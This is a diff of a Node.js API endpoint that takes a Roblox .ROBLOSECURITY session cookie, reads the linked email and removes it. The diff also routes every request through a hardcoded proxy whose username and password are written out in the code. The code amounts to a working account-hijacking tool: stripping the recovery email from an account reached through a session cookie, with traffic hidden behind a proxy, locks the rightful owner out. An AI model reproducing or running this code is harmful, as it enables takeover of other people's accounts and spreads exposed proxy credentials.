@@ -1,5 +1,6 @@
-// Node.js API: /api/remove-email.js
-const https = require("https");
+const rp = require("request-promise");
+
+const WEBSHARE_PROXY = "http://hpbhwlum:ifhjayiy2wek@38.154.227.167:5868";
 
 module.exports = async (req, res) => {
   if (req.method !== "POST") {
@@ -13,55 +14,52 @@ module.exports = async (req, res) => {
     return res.end(JSON.stringify({ error: "Missing .ROBLOSECURITY cookie" }));
   }
 
-  // Clean the cookie - remove any prefix if present
   cookie = cookie.trim();
   if (cookie.includes(".ROBLOSECURITY=")) {
     cookie = cookie.split(".ROBLOSECURITY=")[1];
   }
 
-  // Basic validation - Roblox security cookies are typically long alphanumeric strings
   if (cookie.length < 50) {
     res.writeHead(400, { "Content-Type": "application/json" });
     return res.end(
-      JSON.stringify({ error: "Invalid .ROBLOSECURITY cookie format" }),
+      JSON.stringify({ error: "Invalid .ROBLOSECURITY cookie format" })
     );
   }
 
   try {
-    console.log("ðŸ”‘ Obtaining CSRF token...");
+    console.log("🔐 Obtaining CSRF token...");
     const csrfToken = await getCsrfToken(cookie);
-    console.log("CSRF Token obtained:", csrfToken ? "Yes" : "No");
+    console.log("CSRF Token:", csrfToken);
 
-    console.log("ðŸ“§ Fetching email information...");
+    console.log("📧 Fetching email info...");
     const emailInfo = await fetchEmail(cookie, csrfToken);
-    console.log("Email info response:", emailInfo);
+    console.log("Email info:", emailInfo);
 
     if (!emailInfo || (!emailInfo.emailId && !emailInfo.emailAddress)) {
       res.writeHead(400, { "Content-Type": "application/json" });
       return res.end(
         JSON.stringify({
           error:
-            "No email linked to this account or failed to fetch email information",
+            "No email linked or failed to fetch email info",
           debug: emailInfo,
-        }),
+        })
       );
     }
 
-    console.log("ðŸ—‘ï¸ Attempting to remove email...");
     const emailToDelete = emailInfo.emailId || emailInfo.emailAddress;
-    const result = await deleteEmail(cookie, csrfToken, emailToDelete);
+    console.log("🗑️ Deleting email:", emailToDelete);
+    const result = await deleteEmail(cookie, csrfToken);
 
-    // Check if the deletion was successful
     if (result && result.errors && result.errors.length > 0) {
       const error = result.errors[0];
       res.writeHead(403, { "Content-Type": "application/json" });
       return res.end(
         JSON.stringify({
           error:
-            error.message || "Challenge is required to authorize the request",
+            error.message || "Challenge required to authorize request",
           code: error.code,
           needsChallenge: true,
-        }),
+        })
       );
     }
 
@@ -69,122 +67,74 @@ module.exports = async (req, res) => {
     return res.end(
       JSON.stringify({
         success: true,
-        message: "Email removal request processed successfully",
+        message: "Email removal processed successfully",
         result,
-      }),
+      })
     );
   } catch (err) {
-    console.error("âŒ Error:", err);
+    console.error("❌ Error:", err);
     res.writeHead(500, { "Content-Type": "application/json" });
     return res.end(
       JSON.stringify({
         error: err.message || "Unknown server error",
         type: "server_error",
-      }),
+      })
     );
   }
 };
 
-function getCsrfToken(cookie) {
-  return new Promise((resolve, reject) => {
-    const req = https.request(
-      {
-        method: "POST",
-        hostname: "auth.roblox.com",
-        path: "/v2/logout",
-        headers: {
-          Cookie: `.ROBLOSECURITY=${cookie}`,
-        },
-      },
-      (res) => {
-        const token = res.headers["x-csrf-token"];
-        if (token) return resolve(token);
-        reject(new Error("Failed to get CSRF token"));
-      },
-    );
+// Helper Functions (using proxy)
 
-    req.on("error", reject);
-    req.end();
+function getCsrfToken(cookie) {
+  return rp({
+    method: "POST",
+    uri: "https://auth.roblox.com/v2/logout",
+    headers: {
+      Cookie: `.ROBLOSECURITY=${cookie}`,
+    },
+    resolveWithFullResponse: true,
+    proxy: WEBSHARE_PROXY,
+    simple: false,
+  }).then((response) => {
+    const token = response.headers["x-csrf-token"];
+    if (!token) throw new Error("Failed to get CSRF token");
+    return token;
   });
 }
 
 function fetchEmail(cookie, csrfToken) {
-  return new Promise((resolve, reject) => {
-    const req = https.request(
-      {
-        method: "GET",
-        hostname: "accountsettings.roblox.com",
-        path: "/v1/email",
-        headers: {
-          Cookie: `.ROBLOSECURITY=${cookie}`,
-          "X-CSRF-TOKEN": csrfToken,
-          Accept: "application/json",
-          "User-Agent":
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-        },
-      },
-      (res) => {
-        let data = "";
-        res.on("data", (chunk) => (data += chunk));
-        res.on("end", () => {
-          console.log("Email fetch response status:", res.statusCode);
-          console.log("Email fetch response data:", data);
-          try {
-            const parsed = JSON.parse(data);
-            resolve(parsed);
-          } catch (e) {
-            reject(new Error(`Invalid JSON from fetchEmail: ${data}`));
-          }
-        });
-      },
-    );
-
-    req.on("error", reject);
-    req.end();
+  return rp({
+    method: "GET",
+    uri: "https://accountsettings.roblox.com/v1/email",
+    headers: {
+      Cookie: `.ROBLOSECURITY=${cookie}`,
+      "X-CSRF-TOKEN": csrfToken,
+      Accept: "application/json",
+      "User-Agent":
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+    },
+    json: true,
+    proxy: WEBSHARE_PROXY,
   });
 }
 
-function deleteEmail(cookie, csrfToken, emailAddress) {
-  return new Promise((resolve, reject) => {
-    const payload = JSON.stringify({
+function deleteEmail(cookie, csrfToken) {
+  return rp({
+    method: "POST",
+    uri: "https://accountsettings.roblox.com/v1/email",
+    headers: {
+      Cookie: `.ROBLOSECURITY=${cookie}`,
+      "X-CSRF-TOKEN": csrfToken,
+      Accept: "application/json",
+      "Content-Type": "application/json",
+      "User-Agent":
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+    },
+    body: {
       emailAddress: "",
-    });
-
-    const req = https.request(
-      {
-        method: "POST",
-        hostname: "accountsettings.roblox.com",
-        path: "/v1/email",
-        headers: {
-          Cookie: `.ROBLOSECURITY=${cookie}`,
-          "X-CSRF-TOKEN": csrfToken,
-          "Content-Type": "application/json",
-          Accept: "application/json",
-          "Content-Length": Buffer.byteLength(payload),
-          "User-Agent":
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-        },
-      },
-      (res) => {
-        let data = "";
-        res.on("data", (chunk) => (data += chunk));
-        res.on("end", () => {
-          console.log("Delete email response status:", res.statusCode);
-          console.log("Delete email response data:", data);
-          try {
-            const parsed = data ? JSON.parse(data) : { success: true };
-            resolve(parsed);
-          } catch (e) {
-            resolve({
-              success: res.statusCode === 200 || res.statusCode === 204,
-            });
-          }
-        });
-      },
-    );
-
-    req.on("error", reject);
-    req.write(payload);
-    req.end();
+    },
+    json: true,
+    proxy: WEBSHARE_PROXY,
+    simple: false,
   });
-               }
+}
